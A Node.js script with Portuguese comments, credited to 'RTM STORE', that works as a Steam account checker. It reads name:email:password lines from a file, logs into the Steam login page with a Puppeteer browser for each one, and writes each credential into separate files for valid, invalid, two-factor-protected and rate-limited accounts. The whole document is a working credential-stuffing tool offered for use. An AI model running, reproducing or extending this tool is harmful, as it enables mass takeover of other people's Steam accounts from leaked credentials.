const fs = require('fs');
const puppeteer = require('puppeteer-extra').default;
const chalk = require('chalk');

// Arte ASCII
console.log(chalk.red(`
"██████╗ ████████╗███╗   ███╗    ███████╗████████╗ ██████╗ ██████╗ ███████╗",
"██╔══██╗╚══██╔══╝████╗ ████║    ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗██╔════╝",
"██████╔╝   ██║   ██╔████╔██║    ███████╗   ██║   ██║   ██║██████╔╝█████╗  ",
"██╔══██╗   ██║   ██║╚██╔╝██║    ╚════██║   ██║   ██║   ██║██╔══██╗██╔══╝  ",
"██║  ██║   ██║   ██║ ╚═╝ ██║    ███████║   ██║   ╚██████╔╝██║  ██║███████╗",
"╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝    ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝"
`));

// Função para fazer login
async function fazerLogin(sitealvo, email, password, nome) {
    const browser = await puppeteer.launch({
        headless: false,
        ignoreHTTPSErrors: true,
        defaultViewport: null,
        args: ['--start-maximized']
    });

    const page = await browser.newPage();

    try {
        // Exibe o nome da conta
        console.log(chalk.blue(`\nVerificando conta: ${nome}`));

        // Aguarda o carregamento completo da página
        await page.goto(sitealvo, { waitUntil: 'networkidle2' });
        console.log(chalk.yellow('Página carregada.'));

        // Aguardar campo de e-mail e digitar
        await page.waitForSelector('input[type="text"]', { visible: true, timeout: 15000 });
        await page.type('input[type="text"]', email, { delay: 50 });
        console.log(chalk.green('Usuário preenchido com sucesso.'));

        // Aguardar campo de senha e digitar
        await page.waitForSelector('input[type="password"]', { visible: true, timeout: 15000 });
        await page.type('input[type="password"]', password, { delay: 50 });
        console.log(chalk.green('Senha preenchida com sucesso.'));

        // Clica no botão "Entrar"
        await page.keyboard.press('Enter'); // Simula a tecla Enter para submeter o formulário
        console.log(chalk.green('Botão "Entrar" pressionado.'));

        // Aumenta o tempo de espera após clicar no botão "Entrar"
        await page.waitForTimeout(10000); // Espera 10 segundos para o carregamento
        const urlAtual = page.url();
        console.log(chalk.blue(`URL atual após login: ${urlAtual}`));

        // Verifica elementos que indicam login bem-sucedido
        const loginSucesso = await page.evaluate(() => {
            return document.body.innerText.includes('Biblioteca') || 
                   document.querySelector('div.logged_in_user') ||
                   document.title.includes("Steam"); // Verifica o título da página
        });

        // Captura a mensagem de erro se houver
        const errorMessage = await page.evaluate(() => {
            const errorElement = document.querySelector('.newlogindialog_ErrorMessage');
            return errorElement ? errorElement.innerText : null;
        });

        // Verifica se a página pede código de autenticação
        const requiresVerification = await page.evaluate(() => {
            return document.body.innerText.includes('código de verificação') || 
                   document.querySelector('input[name="twofactorcode"]');
        });

        // Log para melhor depuração
        if (loginSucesso) {
            console.log(chalk.green(`[+] Conta Válida (${email})`));
            return { status: "valid" };
        } else if (requiresVerification) {
            console.log(chalk.yellow(`[!] Conta (${email}) pede código de verificação. Não pode ser verificada.`));
            return { status: "verification_required" };
        } else if (errorMessage && errorMessage.toLowerCase().includes('muitas tentativas')) {
            console.log(chalk.cyan(`[!] Conta (${email}) bloqueada temporariamente por muitas tentativas de login. Tente novamente mais tarde.`));
            return { status: "too_many_attempts" };
        } else if (errorMessage) {
            console.log(chalk.red(`[-] Erro de login detectado para a conta (${email}): ${errorMessage}`));
            return { status: "login_error" };
        } else {
            console.log(chalk.red(`[-] Dados inválidos: e-mail ou senha incorretos (${email})`));
            return { status: "invalid" };
        }

    } catch (error) {
        console.error(chalk.red(`Erro ao tentar fazer login: ${error.message}`));
        return { status: "error" };
    } finally {
        await browser.close(); // Fecha o navegador no final
    }
}

// Função principal para ler as contas do arquivo e verificar uma por uma
async function main() {
    const sitealvo = 'https://store.steampowered.com/login/'; // URL de login do Steam
    const inputFile = 'Contas.txt'; // Arquivo de entrada
    const validoFile = 'input/valido.txt'; // Arquivo para contas válidas
    const invalidoFile = 'input/invalido.txt'; // Arquivo para contas inválidas
    const verifFile = 'input/verificacao.txt'; // Arquivo para contas que pedem código de verificação
    const tentativasFile = 'input/tentativas.txt'; // Arquivo para contas bloqueadas temporariamente

    // Criação dos streams de escrita para os arquivos
    const validoStream = fs.createWriteStream(validoFile, { flags: 'a' });
    const invalidoStream = fs.createWriteStream(invalidoFile, { flags: 'a' });
    const verifStream = fs.createWriteStream(verifFile, { flags: 'a' });
    const tentativasStream = fs.createWriteStream(tentativasFile, { flags: 'a' });

    // Lê as contas do arquivo
    const lines = fs.readFileSync(inputFile, 'utf8').split('\n');
    let valido = 0;
    let invalida = 0;
    let verificacao = 0;
    let bloqueadas = 0;

    for (const line of lines) {
        const [nome, email, password] = line?.split(':');
        if (nome && email && password) {
            const result = await fazerLogin(sitealvo, email, password, nome);
            const { status } = result;

            // Escreve no arquivo correspondente
            if (status === "valid") {
                valido++;
                validoStream.write(`${nome}:${email}:${password}\n`);
            } else if (status === "invalid") {
                invalida++;
                invalidoStream.write(`${nome}:${email}:${password}\n`);
            } else if (status === "verification_required") {
                verificacao++;
                verifStream.write(`${nome}:${email}:${password}\n`);
            } else if (status === "too_many_attempts") {
                bloqueadas++;
                tentativasStream.write(`${nome}:${email}:${password}\n`);
            } else if (status === "login_error") {
                console.log(chalk.red(`[-] Conta ${email} teve um erro de login não especificado. Verifique manualmente.`));
            } else {
                console.log(chalk.red(`[-] Conta ${email} não pôde ser verificada devido a um erro inesperado.`));
            }
        }

        // Pode ser ajustado ou removido para mais rapidez
        await new Promise(resolve => setTimeout(resolve, 500));
    }

    console.clear();
    console.log(chalk.blue(`Resultado: \n\n - Total Válidas: ${valido} (Salvas no valido.txt)`));
    console.log(chalk.red(` - Total Inválidas: ${invalida} (Salvas no invalido.txt)`));
    console.log(chalk.yellow(` - Total com Verificação Pendentes: ${verificacao} (Salvas no verificacao.txt)`));
    console.log(chalk.cyan(` - Total Bloqueadas Temporariamente: ${bloqueadas} (Salvas no tentativas.txt)`));

    // Mensagem de créditos
    console.log(chalk.yellow('Créditos: RTM STORE creator checker for Steam'));

    // Finaliza os streams
    validoStream.end();
    invalidoStream.end();
    verifStream.end();
    tentativasStream.end();
}

// Inicia o processo
main().catch(console.error);